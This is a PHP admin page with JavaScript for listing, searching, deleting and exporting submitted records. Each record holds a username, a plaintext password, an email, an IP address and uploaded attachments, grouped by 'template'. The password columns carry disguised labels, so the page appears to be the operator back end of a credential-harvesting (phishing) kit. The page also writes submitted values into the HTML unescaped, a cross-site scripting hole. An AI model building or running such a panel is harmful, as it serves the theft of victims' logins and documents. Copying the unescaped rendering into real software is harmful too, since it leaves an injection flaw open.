<?php
define('IN_SYSTEM', true);
require_once '../inc/conn.php';
require_once '../inc/pubs.php';
require_once '../inc/sqls.php';

check_login();

$db = new Database($pdo);

// 处理AJAX请求
if(isset($_GET['act'])) {
    header('Content-Type: application/json; charset=utf-8');
    $input = json_decode(file_get_contents("php://input"),True);
    $act = isset($_GET['act']) ? $_GET['act'] : "list";
    switch($act) {
        case 'list':
            // 获取参数
            $page = isset($input['page']) ? intval($input['page']) : 1;
            $field = isset($input['field']) ? safe_input($input['field']) : '';
            $keyword = isset($input['keyword']) ? safe_input($input['keyword']) : '';
            $sort = isset($input['sort']) ? safe_input($input['sort']) : '';
            $order = isset($input['order']) ? strtoupper(safe_input($input['order'])) : 'DESC';
            
            // 构建查询条件
            $search = [];
            if($keyword !== '') {
                $search[$field] = $keyword;
            }
            
            // 构建排序
            $orderBy = ['field' => $sort ?: 'id', 'direction' => $order];
            
            // 获取数据
            $result = $db->getEntries($page, 10, $search, $orderBy);
            json_result(1, '', $result);
            break;
            
        case 'detail':
            $id = isset($input['id']) ? intval($input['id']) : 0;
            if($id < 1) {
                json_result(0, '无效的ID:'.$id);
            }
            
            $entry = $db->getEntry($id);
            if(!$entry) {
                json_result(0, '记录不存在');
            }
            
            json_result(1, '', $entry);
            break;
            
        case 'status':
            $id = isset($input['id']) ? intval($input['id']) : 0;
            $status = isset($input['status']) ? intval($input['status']) : -1;
            
            if($id <= 0 || $status < 0 || $status > 1) {
                json_result(0, '参数错误');
            }
            
            if($db->updateEntryStatus($id, $status)) {
                json_result(1, '状态更新成功');
            }
            json_result(0, '状态更新失败');
            break;
            
        case 'delete':
            $ids = isset($input['ids']) ? $input['ids'] : [];
            if(empty($ids) || !is_array($ids)) {
                json_result(0, '请选择要删除的记录');
            }
            
            $success = true;
            foreach($ids as $id) {
                $id = intval($id);
                if($id > 0 && !$db->deleteEntry($id)) {
                    $success = false;
                    break;
                }
            }
            
            json_result($success ? 1 : 0, $success ? '删除成功' : '删除失败');
            break;
            
        default:
            json_result(0, '未知操作');
    }
    exit;
}

require_once 'head.php';
?>

<div class="content">
    <div class="list-header">
        <h2>信息列表</h2>
        <div class="list-tools">
            <select id="searchField">
                <option value="template_id">模板</option>
                <option value="username">用户名</option>
                <option value="email">邮箱</option>
                <option value="submit_ip">IP地址</option>
            </select>
            <input type="text" id="searchValue" placeholder="搜索关键词...">
            <button onclick="searchData()">查询</button>
            <button onclick="batchDelete()" class="danger">批量删除</button>
        </div>
    </div>
    
    <table class="data-table">
        <thead>
            <tr>
                <th width="20"><input type="checkbox" onclick="toggleAll(this)"></th>
                <th data-field="id">ID <span class="sort-icon"></span></th>
                <th data-field="template_id">模板 <span class="sort-icon"></span></th>
                <th data-field="username">字段1 <span class="sort-icon"></span></th>
                <th data-field="password">字段2 <span class="sort-icon"></span></th>
                <th data-field="email">字段3 <span class="sort-icon"></span></th>
                <th data-field="submit_date">提交日期 <span class="sort-icon"></span></th>
                <th data-field="submit_ip">IP地址 <span class="sort-icon"></span></th>
                <th data-field="status">状态 <span class="sort-icon"></span></th>
                <th>操作</th>
            </tr>
        </thead>
        <tbody id="dataList"></tbody>
    </table>
    
    <div id="pagination" class="pagination"></div>
</div>

<div id="detailModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>详细信息</h3>
            <span class="close" onclick="closeModal()">&times;</span>
        </div>
        <div class="modal-body">
            <div class="tabs">
                <div class="tab-header">
                    <span class="active" data-tab="info">基本信息</span>
                    <span data-tab="files">附件信息</span>
                    <span data-tab="downs">单条下载</span>
                </div>
                <div class="tab-content">
                    <div id="info" class="tab-pane active"></div>
                    <div id="files" class="tab-pane"></div>
                    <div id="downs" class="tab-pane">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
// 全局变量
var currentPage = 1;
var currentSort = 'id';
var currentOrder = 'DESC';

// 加载数据
function loadData() {
    var field = document.getElementById('searchField').value;
    var keyword = document.getElementById('searchValue').value;
    
    showLoading();
    ajax({
        url: '?act=list',
        method: 'POST',
        data: {
            act: 'list',
            page: currentPage,
            field: field,
            keyword: keyword,
            sort: currentSort,
            order: currentOrder
        },
        success: function(res) {
            hideLoading();
            if(res.code == 1) {
                renderList(res.data.data);
                renderPagination(res.data.pages);
                updateSortIcons();
            } else {
                alert(res.msg || '加载失败');
            }
        },
        error: function(xhr) {
            hideLoading();
            console.error('Ajax error:', xhr);
            alert('服务器错误');
        }
    });
}

// 渲染列表
function renderList(data) {
    var html = '';
    data.forEach(function(item) {
        html += `
            <tr>
                <td><input type="checkbox" value="${item.id}"></td>
                <td>${item.id}</td>
                <td>${item.template_id}</td>
                <td>${item.username}</td>
                <td>${item.password}</td>
                <td>${item.email}</td>
                <td>${item.submit_date} ${item.submit_time}</td>
                <td>${item.submit_ip}</td>
                <td>
                    <select onchange="updateStatus(${item.id}, this.value)">
                        <option value="0" ${item.status == 0 ? 'selected' : ''}>未完成</option>
                        <option value="1" ${item.status == 1 ? 'selected' : ''}>已完成</option>
                    </select>
                </td>
                <td>
                    <button onclick="showDetail(${item.id})">详情</button>
                    <button onclick="deleteEntry(${item.id})" class="danger">删除</button>
                </td>
            </tr>
        `;
    });
    document.getElementById('dataList').innerHTML = html || '<tr><td colspan="10" class="text-center">暂无数据</td></tr>';
}

// 渲染分页
function renderPagination(total) {
    if(total <= 1) {
        document.getElementById('pagination').innerHTML = '';
        return;
    }
    
    var html = `
        <a href="javascript:;" onclick="gotoPage(1)" class="${currentPage == 1 ? 'disabled' : ''}">首页</a>
        <a href="javascript:;" onclick="gotoPage(${currentPage - 1})" class="${currentPage == 1 ? 'disabled' : ''}">上一页</a>
        <select onchange="gotoPage(this.value)">
    `;
    
    for(var i = 1; i <= total; i++) {
        html += `<option value="${i}" ${currentPage == i ? 'selected' : ''}>第${i}页</option>`;
    }
    
    html += `
        </select>
        <a href="javascript:;" onclick="gotoPage(${currentPage + 1})" class="${currentPage == total ? 'disabled' : ''}">下一页</a>
        <a href="javascript:;" onclick="gotoPage(${total})" class="${currentPage == total ? 'disabled' : ''}">末页</a>
    `;
    
    document.getElementById('pagination').innerHTML = html;
}

// 更新排序图标
function updateSortIcons() {
    var headers = document.querySelectorAll('th[data-field]');
    headers.forEach(function(th) {
        var icon = th.querySelector('.sort-icon');
        var field = th.getAttribute('data-field');
        if(field == currentSort) {
            icon.className = 'sort-icon ' + (currentOrder == 'ASC' ? 'asc' : 'desc');
        } else {
            icon.className = 'sort-icon';
        }
    });
}

// 排序处理
document.querySelectorAll('th[data-field]').forEach(function(th) {
    th.addEventListener('click', function() {
        var field = this.getAttribute('data-field');
        if(field == currentSort) {
            currentOrder = currentOrder == 'ASC' ? 'DESC' : 'ASC';
        } else {
            currentSort = field;
            currentOrder = 'ASC';
        }
        loadData();
    });
});

// 更新状态
function updateStatus(id, status) {
    showLoading();
    ajax({
        url: '?act=status',
        method: 'POST',
        data: {
            act: 'status',
            id: id,
            status: status
        },
        success: function(res) {
            hideLoading();
            if(res.code == 1) {
                loadData();
            } else {
                alert(res.msg || '更新失败');
            }
        },
        error: function(xhr) {
            hideLoading();
            console.error('Ajax error:', xhr);
            alert('服务器错误');
        }
    });
}

// 显示详情
function showDetail(id) {
    showLoading();
    ajax({
        url: '?act=detail',
        method: 'POST',
        data: {
            act: 'detail',
            id: id
        },
        success: function(res) {
            hideLoading();
            if(res.code == 1) {
                var data = res.data;
                var idesc = typeof data.idesc === 'string' ? JSON.parse(data.idesc) : data.idesc;
                
                // 渲染基本信息
                var infoHtml = `
                    <table class="detail-table">
                        <tr><td>ID：</td><td>${data.id}</td></tr>
                        <tr><td>模板：</td><td>${data.template_id}</td></tr>
                        <tr><td>字段一</td><td>${data.username}</td></tr>
                        <tr><td>字段二</td><td>${data.password}</td></tr>
                        <tr><td>字段三</td><td>${data.email}</td></tr>
                        <tr><td>提交日期：</td><td>${data.submit_date}</td></tr>
                        <tr><td>提交时间：</td><td>${data.submit_time}</td></tr>
                        <tr><td>IP地址：</td><td>${data.submit_ip}</td></tr>
                        <tr><td>状态：</td><td>${data.status == 1 ? '已完成' : '未完成'}</td></tr>
                `;
                
                for(var key in idesc) {
                    infoHtml += `<tr><td>${key}：</td><td>${idesc[key]}</td></tr>`;
                }
                infoHtml += '</table>';
                document.getElementById('info').innerHTML = infoHtml;
                
                // 渲染附件信息
                var filesHtml = '<table class="detail-table">';
                if(data.attachments && data.attachments.length > 0) {
                    data.attachments.forEach(function(file) {
                        filesHtml += `
                            <tr>
                                <td>${file.field_name}${file.field_index}</td>
                                <td><a href="../${file.file_path}" target="_blank">查看文件</a></td>
                            </tr>
                        `;
                    });
                } else {
                    filesHtml += '<tr><td colspan="2">无附件</td></tr>';
                }
                filesHtml += '</table>';
                document.getElementById('files').innerHTML = filesHtml;         
              
                 // 渲染附件信息
                var filesHtml = `
        <button onclick="exportData('${data.id}')">下载</button>
        <div id="exportResult${data.id}" style="display:none;">
            <p><a href="#" id="downloadLink${data.id}" target="_blank">点击下载</a></p>
        </div>
                        `;
                document.getElementById('downs').innerHTML = filesHtml;
                
                document.getElementById('detailModal').style.display = 'block';
            } else {
                alert(res.msg || '获取详情失败');
            }
        },
        error: function(xhr) {
            hideLoading();
            console.error('Ajax error:', xhr);
            alert('服务器错误');
        }
    });
}

// 删除记录
function deleteEntry(id) {
    if(!confirm('确定要删除这条记录吗？')) return;
    
    showLoading();
    ajax({
        url: '?act=delete',
        method: 'POST',
        data: {
            act: 'delete',
            ids: [id]
        },
        success: function(res) {
            hideLoading();
            alert(res.msg);
            if(res.code == 1) {
                loadData();
            }
        },
        error: function(xhr) {
            hideLoading();
            console.error('Ajax error:', xhr);
            alert('服务器错误');
        }
    });
}

// 批量删除
function batchDelete() {
    var checked = document.querySelectorAll('tbody input[type="checkbox"]:checked');
    if(checked.length == 0) {
        alert('请选择要删除的记录');
        return;
    }
    
    if(!confirm('确定要删除选中的记录吗？')) return;
    
    var ids = Array.from(checked).map(function(cb) {
        return parseInt(cb.value);
    });
    
    showLoading();
    ajax({
        url: '?act=delete',
        method: 'POST',
        data: {
            act: 'delete',
            ids: ids
        },
        success: function(res) {
            hideLoading();
            alert(res.msg);
            if(res.code == 1) {
                loadData();
            }
        },
        error: function(xhr) {
            hideLoading();
            console.error('Ajax error:', xhr);
            alert('服务器错误');
        }
    });
}

// 全选/取消全选
function toggleAll(checkbox) {
    var checkboxes = document.querySelectorAll('tbody input[type="checkbox"]');
    checkboxes.forEach(function(cb) {
        cb.checked = checkbox.checked;
    });
}

// 跳转页码
function gotoPage(page) {
    page = parseInt(page);
    if(page == currentPage) return;
    currentPage = page;
    loadData();
}

// 搜索
function searchData() {
    currentPage = 1;
    loadData();
}

// 关闭详情模态框
function closeModal() {
    document.getElementById('detailModal').style.display = 'none';
}

// 初始化标签页切换
document.querySelectorAll('.tab-header span').forEach(function(tab) {
    tab.addEventListener('click', function() {
        document.querySelectorAll('.tab-header span').forEach(function(t) {
            t.classList.remove('active');
        });
        this.classList.add('active');
        
        var tabId = this.getAttribute('data-tab');
        document.querySelectorAll('.tab-pane').forEach(function(pane) {
            pane.classList.remove('active');
        });
        document.getElementById(tabId).classList.add('active');
    });
});

// 加载初始数据
loadData();
</script>
<script>
function exportData(pi) {
    ajax({
        url: 'idown.php?act=down&id='+pi,
        method: 'POST',
        data: {},
        success: function(res) {
            if (res.code == 1) {
                document.getElementById('exportResult'+pi).style.display = 'block';
                document.getElementById('downloadLink'+pi).href = res.data.url;
            } else {
                alert(res.msg);
            }
        }
    });
}
</script>
<?php require_once 'foot.php'; ?>